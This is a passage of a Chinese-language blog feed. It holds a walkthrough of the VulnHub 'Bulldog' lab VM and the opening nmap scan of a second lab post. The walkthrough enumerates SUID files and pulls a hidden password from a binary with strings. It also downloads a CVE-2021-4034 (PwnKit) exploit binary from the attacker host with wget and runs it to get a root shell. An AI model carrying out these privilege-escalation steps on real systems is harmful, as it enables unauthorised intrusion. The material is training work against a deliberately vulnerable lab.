`crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># m h dom mon dow user  command</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>看看 s 权限文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">django@bulldog:/home/django$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>   407927     44 -rwsr-xr--   1 root     messagebus    42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>   278771     40 -rwsr-xr-x   1 root     root          38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic<br>   280147     16 -rwsr-xr-x   1 root     root          14864 Jan 17  2016 /usr/lib/policykit-1/polkit-agent-helper-1<br>   279434    420 -rwsr-xr-x   1 root     root         428240 Mar 16  2017 /usr/lib/openssh/ssh-keysign<br>   262725     12 -rwsr-xr-x   1 root     root          10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device<br>   280225    204 -rwsr-xr-x   1 root     root         208680 Apr 29  2017 /usr/lib/snapd/snap-confine<br>   262540     56 -rwsr-xr-x   1 root     root          54256 May 16  2017 /usr/bin/passwd<br>   280156     24 -rwsr-xr-x   1 root     root          23376 Jan 17  2016 /usr/bin/pkexec<br>   262529     40 -rwsr-xr-x   1 root     root          39904 May 16  2017 /usr/bin/newgrp<br>   279685     52 -rwsr-sr-x   1 daemon   daemon        51464 Jan 14  2016 /usr/bin/at<br>   262624    136 -rwsr-xr-x   1 root     root         136808 Jul  4  2017 /usr/bin/sudo<br>   278786     36 -rwsr-xr-x   1 root     root          32944 May 16  2017 /usr/bin/newuidmap<br>   262404     40 -rwsr-xr-x   1 root     root          40432 May 16  2017 /usr/bin/chsh<br>   278787     36 -rwsr-xr-x   1 root     root          32944 May 16  2017 /usr/bin/newgidmap<br>   262465     76 -rwsr-xr-x   1 root     root          75304 May 16  2017 /usr/bin/gpasswd<br>   262402     52 -rwsr-xr-x   1 root     root          49584 May 16  2017 /usr/bin/chfn<br>   131149     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /bin/ping<br>   131135     40 -rwsr-xr-x   1 root     root          40152 Jun 14  2017 /bin/mount<br>   131184     28 -rwsr-xr-x   1 root     root          27608 Jun 14  2017 /bin/umount<br>   131166     40 -rwsr-xr-x   1 root     root          40128 May 16  2017 /bin/su<br>   131150     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /bin/ping6<br>   133809     32 -rwsr-xr-x   1 root     root          30800 Jul 12  2016 /bin/fusermount<br>   133812    140 -rwsr-xr-x   1 root     root         142032 Jan 28  2017 /bin/ntfs-3g<br></code></pre></td></tr></table></figure><p>有 polkit-agent-helper-1和 pkexec，应该可以使用 <code>CVE-2021-4034</code>，不过还是一步一步尝试有没有别的攻击路径，<code>/bin/ntfs-3g</code> 是第一次见到，搜索一下的确有个脚本：<a href="https://www.exploit-db.com/exploits/41240">ntfs-3g (Debian 9) - Local Privilege Escalation - Linux local Exploit (exploit-db.com)</a></p><p>尝试运行，但是并没有成功，错误信息如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[-] FAILED: your need make / build tools<br>./41240.sh: line 61: /tmp/r00t: No such file or directory<br>./41240.sh: line 62: /tmp/r00t: No such file or directory<br><br></code></pre></td></tr></table></figure><p>看了眼源码，应该是没有利用成功，没复制 bash 文件到 tmp 中，导致最后找不到文件。</p><h3 id="隐藏文件查找"><a href="#隐藏文件查找" class="headerlink" title="隐藏文件查找"></a>隐藏文件查找</h3><p>看看可写文件吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">django@bulldog:/home/django$ find / -<span class="hljs-built_in">type</span> f -writable -not -path <span class="hljs-string">&quot;/proc/*&quot;</span> -not -path <span class="hljs-string">&quot;/home/*&quot;</span> -not -path <span class="hljs-string">&quot;/sys*&quot;</span> 2&gt;/dev/null<br>&lt; -not -path <span class="hljs-string">&quot;/proc/*&quot;</span> -not -path <span class="hljs-string">&quot;/home/*&quot;</span> -not -path <span class="hljs-string">&quot;/sys*&quot;</span> 2&gt;/dev/null   <br>/.hiddenAVDirectory/AVApplication.py<br></code></pre></td></tr></table></figure><p>根目录下有个可写的脚本文件，看看这个文件的信息吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">django@bulldog:/home/django$ <span class="hljs-built_in">ls</span> -liah /.hiddenAVDirectory/AVApplication.py<br><span class="hljs-built_in">ls</span> -liah /.hiddenAVDirectory/AVApplication.py<br>141860 -rwxrwxrwx 1 root root 157 Aug 26  2017 /.hiddenAVDirectory/AVApplication.py<br>django@bulldog:/home/django$ <span class="hljs-built_in">cd</span> /.hiddenAVDirectory<br><span class="hljs-built_in">cd</span> /.hiddenAVDirectory<br>django@bulldog:/.hiddenAVDirectory$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 12K<br>131483 drwxr-xr-x  2 root root 4.0K Aug 26  2017 .<br>     2 drwxr-xr-x 24 root root 4.0K Aug 26  2017 ..<br>141860 -rwxrwxrwx  1 root root  157 Aug 26  2017 AVApplication.py<br></code></pre></td></tr></table></figure><p>这个应该就是之前提过的入侵检测程序，不过有点简陋，而且权限是 777，感觉可能是个突破点，但是如果没有找到调用它的方式那也无济于事，<code>ps aux</code> 和 <code>netsat -a</code> 翻找了一下没有发现可利用的点。刚开始觉得这个文件或许有突破口花了不少心思排除，浪费了不少时间。</p><p>接下来就逐层文件夹翻翻吧，首先看看 home 目录下的文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">django@bulldog:/home$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 16K<br>    12 drwxr-xr-x  4 root         root         4.0K Aug 24  2017 .<br>     2 drwxr-xr-x 24 root         root         4.0K Aug 26  2017 ..<br>   687 drwxr-xr-x  5 bulldogadmin bulldogadmin 4.0K Sep 21  2017 bulldogadmin<br>131698 drwxr-xr-x  5 django       django       4.0K Sep 21  2017 django<br></code></pre></td></tr></table></figure><p>home 目录下只有两个文件夹：django 和 bulldogadmin，进入 bulldogadmin 查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">django@bulldog:/home$ <span class="hljs-built_in">cd</span> bulldogadmin<br><span class="hljs-built_in">cd</span> bulldogadmin<br>django@bulldog:/home/bulldogadmin$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 40K<br>   687 drwxr-xr-x 5 bulldogadmin bulldogadmin 4.0K Sep 21  2017 .<br>    12 drwxr-xr-x 4 root         root         4.0K Aug 24  2017 ..<br> 16091 -rw-r--r-- 1 bulldogadmin bulldogadmin  220 Aug 24  2017 .bash_logout<br> 16190 -rw-r--r-- 1 bulldogadmin bulldogadmin 3.7K Aug 24  2017 .bashrc<br> 16850 drwx------ 2 bulldogadmin bulldogadmin 4.0K Aug 24  2017 .cache<br>141810 drwxrwxr-x 2 bulldogadmin bulldogadmin 4.0K Sep 21  2017 .hiddenadmindirectory<br> 16892 drwxrwxr-x 2 bulldogadmin bulldogadmin 4.0K Aug 25  2017 .nano<br> 16235 -rw-r--r-- 1 bulldogadmin bulldogadmin  655 Aug 24  2017 .profile<br> 16888 -rw-rw-r-- 1 bulldogadmin bulldogadmin   66 Aug 25  2017 .selected_editor<br> 16854 -rw-r--r-- 1 bulldogadmin bulldogadmin    0 Aug 24  2017 .sudo_as_admin_successful<br> 16232 -rw-rw-r-- 1 bulldogadmin bulldogadmin  217 Aug 24  2017 .wget-hsts<br>django@bulldog:/home/bulldogadmin$ <span class="hljs-built_in">cd</span> .hiddenadmindirectory<br><span class="hljs-built_in">cd</span> .hiddenadmindirectory<br>django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 24K<br>141810 drwxrwxr-x 2 bulldogadmin bulldogadmin 4.0K Sep 21  2017 .<br>   687 drwxr-xr-x 5 bulldogadmin bulldogadmin 4.0K Sep 21  2017 ..<br>141862 -rw-r--r-- 1 bulldogadmin bulldogadmin 8.6K Aug 26  2017 customPermissionApp<br>141866 -rw-rw-r-- 1 bulldogadmin bulldogadmin  619 Sep 21  2017 note<br>django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ <span class="hljs-built_in">cat</span> note<br><span class="hljs-built_in">cat</span> note<br>Nick,<br><br>I<span class="hljs-string">&#x27;m working on the backend permission stuff. Listen, it&#x27;</span>s super prototype but I think it<span class="hljs-string">&#x27;s going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not! </span><br><span class="hljs-string"></span><br><span class="hljs-string">It&#x27;</span>s great stuff! Once I<span class="hljs-string">&#x27;m finished with it, a hacker wouldn&#x27;</span>t even be able to reverse it! Keep <span class="hljs-keyword">in</span> mind that it<span class="hljs-string">&#x27;s still a prototype right now. I am about to get it working with the Django user account. I&#x27;</span>m not sure how I<span class="hljs-string">&#x27;ll implement it for the others. Maybe the webserver is the only one who needs to have root access sometimes?</span><br><span class="hljs-string"></span><br><span class="hljs-string">Let me know what you think of it!</span><br><span class="hljs-string"></span><br><span class="hljs-string">-Ashley</span><br></code></pre></td></tr></table></figure><p>有一段话，大意是开发了一个新的后端权限工具，输入账户密码就可以获取到文件的权限了，我尝试把文件下载到攻击机然后再上传到靶机的 tmp 目录，发现确实提示需要输入密码，使用 cat 命令查看 <code>customPermissionApp</code> 有很多乱码，所以使用 strings 命令查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/bulldog]<br>└─$ strings customPermissionApp            <br>/lib64/ld-linux-x86-64.so.2<br>32S0-t<br>libc.so.6<br>puts<br>__stack_chk_fail<br>system<br>__libc_start_main<br>__gmon_start__<br>GLIBC_2.4<br>GLIBC_2.2.5<br>UH-H<br>SUPERultH<br>imatePASH<br>SWORDyouH<br>CANTget<br>dH34%(<br>AWAVA<br>AUATL<br>[]A\A]A^A_<br>Please enter a valid username to use root privileges<br>        Usage: ./customPermissionApp &lt;username&gt;<br>sudo su root<br></code></pre></td></tr></table></figure><p>上面只列了一部分，给出了此文件的用法，执行的时候加上用户名即可，这里一开始没看出上面几行字中其实就藏着密码</p><h3 id="CVE-2021-4034-提权"><a href="#CVE-2021-4034-提权" class="headerlink" title="CVE-2021-4034 提权"></a>CVE-2021-4034 提权</h3><p>我是使用了刚才提到的 CVE-2021-4034 来进行的提权，所使用的编译好的二进制文件可以在这里找到<a href="https://github.com/dzonerzy/poc-cve-2021-4034">dzonerzy&#x2F;poc-cve-2021-4034: PoC for CVE-2021-4034 dubbed pwnkit (github.com)</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs bash">django@bulldog:/tmp$ wget http://192.168.56.106:8088/exploit<br>wget http://192.168.56.106:8088/exploit<br>--2023-07-03 09:30:45--  http://192.168.56.106:8088/exploit<br>Connecting to 192.168.56.106:8088... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 4442423 (4.2M) [application/octet-stream]<br>Saving to: ‘exploit’<br><br>exploit             100%[===================&gt;]   4.24M  --.-KB/s    <span class="hljs-keyword">in</span> 0.03s   <br><br>2023-07-03 09:30:45 (129 MB/s) - ‘exploit’ saved [4442423/4442423]<br><br>django@bulldog:/tmp$ <span class="hljs-built_in">chmod</span> +x exploit<br><span class="hljs-built_in">chmod</span> +x exploit<br>django@bulldog:/tmp$ ./exploit  <br>./exploit<br>2023/07/03 04:30:56 CMDTOEXECUTE is empty fallback to default value<br>2023/07/03 04:30:56 Executing <span class="hljs-built_in">command</span> sh<br><span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br><span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br><span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>congrats.txt<br><span class="hljs-comment"># cat congrats.txt</span><br><span class="hljs-built_in">cat</span> congrats.txt<br>Congratulations on completing this VM :D That wasn<span class="hljs-string">&#x27;t so bad was it?</span><br><span class="hljs-string"></span><br><span class="hljs-string">Let me know what you thought on twitter, I&#x27;</span>m @frichette_n<br><br>As far as I know there are two ways to get root. Can you find the other one?<br><br>Perhaps the sequel will be more challenging. Until next time, I hope you enjoyed!<br><span class="hljs-comment"># ip a</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:07:ae:20 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.123/24 brd 192.168.56.255 scope global enp0s3<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fe07:ae20/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br><span class="hljs-comment"># uname -a</span><br><span class="hljs-built_in">uname</span> -a<br>Linux bulldog 4.4.0-87-generic <span class="hljs-comment">#110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br></code></pre></td></tr></table></figure><h3 id="拆分组合隐藏的密码"><a href="#拆分组合隐藏的密码" class="headerlink" title="拆分组合隐藏的密码"></a>拆分组合隐藏的密码</h3><p>其实是自己对英文的敏感度不够，没有看出这里其实是把有意义的单词进行拆分组合。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">SUPERultH</span><br><span class="hljs-attribute">imatePASH</span><br><span class="hljs-attribute">SWORDyouH</span><br><span class="hljs-attribute">CANTget</span><br></code></pre></td></tr></table></figure><p>把 H 去掉，其他的连起来就是 <code>SUPERultimatePASSWORDyouCANTget</code>，翻译成中文就是超级中级密码，你不可能拿到。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">django@bulldog:/home/django/bulldog$ su -<br>su -                                                                                                                <br>Password: SUPERultimatePASSWORDyouCANTget                                                                           <br>                                                                                                                    <br>su: Authentication failure                                                                                          <br>django@bulldog:/home/django/bulldog$ sudo su root<br>sudo su root<br>[sudo] password <span class="hljs-keyword">for</span> django: SUPERultimatePASSWORDyouCANTget<br><br>root@bulldog:/home/django/bulldog<span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br>root@bulldog:/home/django/bulldog<span class="hljs-comment"># ip a</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:07:ae:20 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.123/24 brd 192.168.56.255 scope global enp0s3<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fe07:ae20/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>root@bulldog:/home/django/bulldog<span class="hljs-comment"># uname -a</span><br><span class="hljs-built_in">uname</span> -a<br>Linux bulldog 4.4.0-87-generic <span class="hljs-comment">#110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>TYPHOON_1_02 靶机</title>
    <link href="/2023/07/3e56f363190c.html"/>
    <url>/2023/07/3e56f363190c.html</url>
    
    <content type="html"><![CDATA[<h1 id="TYPHOON-1-02-靶机"><a href="#TYPHOON-1-02-靶机" class="headerlink" title="TYPHOON_1_02 靶机"></a>TYPHOON_1_02 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.121<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-01 11:44 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.121<br>Host is up (0.00028s latency).<br>Not shown: 65511 closed tcp ports (reset)<br>PORT      STATE SERVICE<br>21/tcp    open  ftp<br>22/tcp    open  ssh<br>25/tcp    open  smtp<br>53/tcp    open  domain<br>80/tcp    open  http<br>110/tcp   open  pop3<br>111/tcp   open  rpcbind<br>139/tcp   open  netbios-ssn<br>143/tcp   open  imap<br>445/tcp   open  microsoft-ds<br>631/tcp   open  ipp<br>993/tcp   open  imaps<br>995/tcp   open  pop3s<br>2049/tcp  open  nfs<br>3306/tcp  open  mysql<br>5432/tcp  open  postgresql<br>6379/tcp  open  redis<br>8080/tcp  open  http-proxy<br>27017/tcp open  mongod<br>34114/tcp open  unknown<br>34329/tcp open  unknown<br>41559/tcp open  unknown<br>43004/tcp open  unknown<br>49357/tcp open  unknown<br>MAC Address: 08:00:27:2D:C0:8F (Oracle VirtualBox virtual NIC)<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.53 seconds<br></code></pre></td></tr></table></figure><p>端口开放了好多……慢慢抽丝剥茧吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span 